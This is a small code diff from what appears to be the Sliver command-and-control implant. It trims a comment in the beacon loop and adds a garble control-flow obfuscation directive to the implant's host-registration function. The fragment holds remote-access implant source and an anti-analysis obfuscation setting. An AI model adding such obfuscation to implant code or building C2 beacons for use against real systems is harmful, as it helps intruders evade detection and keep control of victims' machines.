@@ -301,7 +301,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			// Short circuit current duration with no error
 		}
 
-		// check if reconfig used to set a new C2-URI 
+		// check if reconfig used to set a new C2-URI
 		if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
 			// {{if .Config.Debug}}
 			log.Printf("[beacon] C2 URI changed to %s, reconnecting...", c2)
@@ -727,6 +727,8 @@ func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.E
 }
 
 // registerSliver - Creates a registration protobuf message
+//
+//garble:controlflow block_splits=2 junk_jumps=2 flatten_passes=1 flatten_hardening=xor trash_blocks=0
 func registerSliver() *sliverpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
